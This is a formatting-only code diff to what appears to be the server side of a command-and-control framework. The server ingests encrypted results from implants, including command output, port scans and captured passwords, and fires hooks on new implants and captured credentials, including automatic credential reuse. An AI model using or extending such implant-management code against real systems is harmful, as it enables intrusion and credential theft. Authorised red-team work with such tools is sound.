@@ -73,12 +73,15 @@ def _fire_hooks(event: str, context: dict[str, Any]) -> list[dict[str, Any]]:
     """Fire conditional hooks for a beacon lifecycle event."""
     try:
         from modules.conditional_hooks import get_hook_engine
+
         engine = get_hook_engine()
-        engine.set_placeholders({
-            "rhost": getattr(_config, "rhost", "") if _config else "",
-            "lhost": getattr(_config, "lhost", "") if _config else "",
-            "domain": getattr(_config, "domain", "") if _config else "",
-        })
+        engine.set_placeholders(
+            {
+                "rhost": getattr(_config, "rhost", "") if _config else "",
+                "lhost": getattr(_config, "lhost", "") if _config else "",
+                "domain": getattr(_config, "domain", "") if _config else "",
+            }
+        )
         return engine.fire(event, context)
     except Exception as exc:
         logger.debug("[hooks] fire failed for %s: %s", event, exc)
@@ -140,8 +143,18 @@ def receive_result(client_id: str):
         decrypted_data = _decrypt_fn(encrypted_data)
         data = json.loads(decrypted_data)
 
-        required_keys = ["output", "command", "client", "pid", "hostname",
-                         "ips", "user", "discovered_ips", "result_portscan", "result_pwd"]
+        required_keys = [
+            "output",
+            "command",
+            "client",
+            "pid",
+            "hostname",
+            "ips",
+            "user",
+            "discovered_ips",
+            "result_portscan",
+            "result_pwd",
+        ]
         if not data or not all(key in data for key in required_keys):
             return jsonify({"status": "error", "message": "Invalid data format"}), 400
 
@@ -163,10 +176,16 @@ def receive_result(client_id: str):
         primary_ip = str(ips).split(",")[0].strip().strip("[]\"'")
 
         _results[sanitized_id] = {
-            "output": output, "client": client_os, "pid": pid,
-            "hostname": hostname, "ips": ips, "user": user,
-            "discovered_ips": discovered_ips, "result_portscan": result_portscan,
-            "result_pwd": result_pwd, "command": command,
+            "output": output,
+            "client": client_os,
+            "pid": pid,
+            "hostname": hostname,
+            "ips": ips,
+            "user": user,
+            "discovered_ips": discovered_ips,
+            "result_portscan": result_portscan,
+            "result_pwd": result_pwd,
+            "command": command,
         }
 
         was_new = sanitized_id not in _connected_clients
@@ -174,22 +193,34 @@ def receive_result(client_id: str):
 
         if was_new:
             logger.info("[beacon] New implant connected: %s (%s)", sanitized_id, primary_ip)
-            _fire_hooks("beacon_connected", {
-                "client_id": sanitized_id, "ip": primary_ip,
-                "hostname": hostname, "user": user,
-                "platform": client_os,
-            })
+            _fire_hooks(
+                "beacon_connected",
+                {
+                    "client_id": sanitized_id,
+                    "ip": primary_ip,
+                    "hostname": hostname,
+                    "user": user,
+                    "platform": client_os,
+                },
+            )
 
-        _fire_hooks("command_executed", {
-            "client_id": sanitized_id, "command": command,
-            "output": output[:500],
-        })
+        _fire_hooks(
+            "command_executed",
+            {
+                "client_id": sanitized_id,
+                "command": command,
+                "output": output[:500],
+            },
+        )
 
         if result_pwd and ":" in str(result_pwd):
-            _fire_hooks("credential_captured", {
-                "host": primary_ip,
-                "username": user,
-            })
+            _fire_hooks(
+                "credential_captured",
+                {
+                    "host": primary_ip,
+                    "username": user,
+                },
+            )
             _trigger_cred_reuse({"host": primary_ip, "username": user})
 
         if result_portscan:
